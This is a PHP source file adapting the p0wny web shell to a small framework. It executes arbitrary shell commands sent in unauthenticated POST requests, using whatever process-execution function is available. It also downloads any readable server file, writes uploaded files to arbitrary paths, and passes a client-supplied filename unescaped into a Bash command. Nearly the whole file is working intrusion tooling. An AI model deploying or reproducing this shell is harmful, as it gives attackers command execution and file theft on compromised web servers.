<?php

declare(strict_types=1);

use Inane\Http\Response;
use Inane\View\Renderer\PhpRenderer;

$file = __DIR__ . '/' . $_SERVER['REQUEST_URI'];
// Server existing files in web dir
if (file_exists($file) && !is_dir($file)) return false;

if (file_exists(getcwd() . DIRECTORY_SEPARATOR . 'vendor' . DIRECTORY_SEPARATOR . 'autoload.php')) {
    $autoload = getcwd() . DIRECTORY_SEPARATOR . 'vendor' . DIRECTORY_SEPARATOR . 'autoload.php';
} elseif (!$autoload = getEnv('ENV_PHP_VENDOR')) {
    echo ('No autoload.php file found at ' . getcwd() . DIRECTORY_SEPARATOR . 'vendor' . DIRECTORY_SEPARATOR . 'autoload.php' . PHP_EOL);
    echo ('AND' . PHP_EOL);
    echo ('Missing environment variable `ENV_PHP_VENDOR` which should point to the php vendor autoload.php file.' . PHP_EOL);
    exit(10);
}

require_once $autoload;

$SHELL_CONFIG = [
    'username' => 'p0wny',
    'hostname' => 'shell',
    'version' => '0.1.0',
];

/**
 * Expands a home-directory path into its absolute form when supported by the shell.
 *
 * @param string $path Path that may begin with a user home-directory shortcut.
 *
 * @return string The expanded path, or the original path when no shortcut is present.
 */
function expandPath(string $path): string {
    if (preg_match('#^(~[a-zA-Z0-9_.-]*)(/.*)?$#', $path, $match)) {
        exec("echo $match[1]", $stdout);

        return $stdout[0] . $match[2];
    }

    return $path;
}

/**
 * Determines whether every named PHP function is available.
 *
 * @param array<string> $list Function names to check.
 *
 * @return bool Whether all supplied functions exist.
 */
function allFunctionExist(array $list = []): bool {
    foreach($list as $entry) {
        if (!function_exists($entry)) {
            return false;
        }
    }

    return true;
}

/**
 * Executes a shell command using the first available process-execution function.
 *
 * @param string $cmd Command to execute.
 *
 * @return false|string|null Captured command output or the underlying function result when unavailable.
 */
function executeCommand(string $cmd): false|string|null {
    $output = '';
    if (function_exists('exec')) {
        exec($cmd, $output);
        $output = implode("\n", $output);
    } elseif (function_exists('shell_exec')) {
        $output = shell_exec($cmd);
    } elseif (allFunctionExist([
        'system',
        'ob_start',
        'ob_get_contents',
        'ob_end_clean',
    ])) {
        ob_start();
        system($cmd);
        $output = ob_get_clean();
    } elseif (allFunctionExist([
        'passthru',
        'ob_start',
        'ob_get_contents',
        'ob_end_clean',
    ])) {
        ob_start();
        passthru($cmd);
        $output = ob_get_clean();
    } elseif (allFunctionExist([
        'popen',
        'feof',
        'fread',
        'pclose',
    ])) {
        $handle = popen($cmd, 'r');
        while(!feof($handle)) {
            $output .= fread($handle, 4096);
        }
        pclose($handle);
    } elseif (allFunctionExist([
        'proc_open',
        'stream_get_contents',
        'proc_close',
    ])) {
        $handle = proc_open($cmd, [
            0 => [
                'pipe',
                'r',
            ],
            1 => [
                'pipe',
                'w',
            ],
        ], $pipes);
        $output = stream_get_contents($pipes[1]);
        proc_close($handle);
    }

    return $output;
}

/**
 * Determines whether the script is executing on Windows.
 *
 * @return bool Whether the current operating system is Windows.
 */
function isRunningWindows(): bool {
    return stripos(PHP_OS, 'WIN') === 0;
}

/**
 * Handles shell commands and the shell-specific built-in commands.
 *
 * @param string $cmd Command submitted by the client.
 * @param string $cwd Current working directory supplied by the client.
 *
 * @return array<string, string> Base64-encoded command output and working directory, or a download response.
 */
function featureShell(string $cmd, string $cwd): array {
    $stdout = '';

    if (preg_match('/^\s*cd\s*(2>&1)?$/', $cmd)) {
        chdir(expandPath('~'));
    } elseif (preg_match('/^\s*cd\s+(.+)\s*(2>&1)?$/', $cmd)) {
        chdir($cwd);
        preg_match('/^\s*cd\s+([^\s]+)\s*(2>&1)?$/', $cmd, $match);
        chdir(expandPath($match[1]));
    } elseif (preg_match('/^\s*download\s+[^\s]+\s*(2>&1)?$/', $cmd)) {
        chdir($cwd);
        preg_match('/^\s*download\s+([^\s]+)\s*(2>&1)?$/', $cmd, $match);

        return featureDownload($match[1]);
    } else {
        chdir($cwd);
        $stdout = executeCommand($cmd);
    }

    return [
        'stdout' => base64_encode($stdout),
        'cwd'    => base64_encode(getcwd()),
    ];
}

/**
 * Returns the current working directory for the client shell.
 *
 * @return array{cwd: string} The base64-encoded current working directory.
 */
function featurePwd(): array {
    return ['cwd' => base64_encode(getcwd())];
}

/**
 * Finds command or file-name completions using Bash completion.
 *
 * @param string $fileName Partial command or file name to complete.
 * @param string $cwd Current working directory supplied by the client.
 * @param string $type Completion type: command or file.
 *
 * @return array{files: list<string>} Base64-encoded matching completion candidates.
 */
function featureHint(string $fileName, string $cwd, string $type): array {
    chdir($cwd);
    if ($type === 'cmd') {
        $cmd = "compgen -c $fileName";
    } else {
        $cmd = "compgen -f $fileName";
    }
    $cmd = "/bin/bash -c \"$cmd\"";
    $files = explode("\n", shell_exec($cmd));
    foreach($files as &$filename) {
        $filename = base64_encode($filename);
    }

    return [
        'files' => $files,
    ];
}

/**
 * Reads a requested file and returns it as a base64-encoded download response.
 *
 * @param string $filePath File path to download.
 *
 * @return array<string, string> Download data or an encoded error response.
 */
function featureDownload(string $filePath): array {
    $file = @file_get_contents($filePath);
    if ($file === false) {
        return [
            'stdout' => base64_encode('File not found / no read permission.'),
            'cwd'    => base64_encode(getcwd()),
        ];
    }

    return [
        'name' => base64_encode(basename($filePath)),
        'file' => base64_encode($file),
    ];
}

/**
 * Writes a base64-encoded client upload into the current working directory.
 *
 * @param string $path Destination file path.
 * @param string $file Base64-encoded file contents.
 * @param string $cwd Current working directory supplied by the client.
 *
 * @return array{stdout: string, cwd: string} Base64-encoded operation status and working directory.
 */
function featureUpload(string $path, string $file, string $cwd): array {
    chdir($cwd);
    $f = @fopen($path, 'wb');
    if ($f === false) {
        return [
            'stdout' => base64_encode('Invalid path / no write permission.'),
            'cwd'    => base64_encode(getcwd()),
        ];
    }

    fwrite($f, base64_decode($file));
    fclose($f);

    return [
        'stdout' => base64_encode('Done.'),
        'cwd'    => base64_encode(getcwd()),
    ];
}

/**
 * Populates the shell prompt configuration from the current host environment.
 *
 * @return void
 */
function initShellConfig(): void {
    global $SHELL_CONFIG;

    if (isRunningWindows()) {
        $username = getenv('USERNAME');
        if ($username !== false) {
            $SHELL_CONFIG['username'] = $username;
        }
    } else {
        $pwuid = posix_getpwuid(posix_geteuid());
        if ($pwuid !== false) {
            $SHELL_CONFIG['username'] = $pwuid['name'];
        }
    }

    $hostname = gethostname();
    if ($hostname !== false) {
        $SHELL_CONFIG['hostname'] = $hostname;
    }
}

// Feature requests return JSON; page requests initialise the prompt and render the shell.
if (isset($_GET['feature'])) {
    $response = null;

    switch ($_GET['feature']) {
        case 'shell':
            $cmd = $_POST['cmd'];
            if (!str_contains($cmd, '2>')) {
                $cmd .= ' 2>&1';
            }
            $response = featureShell($cmd, $_POST['cwd']);
            break;
        case 'pwd':
            $response = featurePwd();
            break;
        case 'hint':
            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);
            break;
        case 'upload':
            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);
    }

    header('Content-Type: application/json');
    echo json_encode($response);
    die();
}

initShellConfig();

$renderer = new PhpRenderer(__DIR__);
$html = $renderer->render('p0wny', $SHELL_CONFIG);

$response = new Response($html);
new \Inane\Http\Client()->send($response);
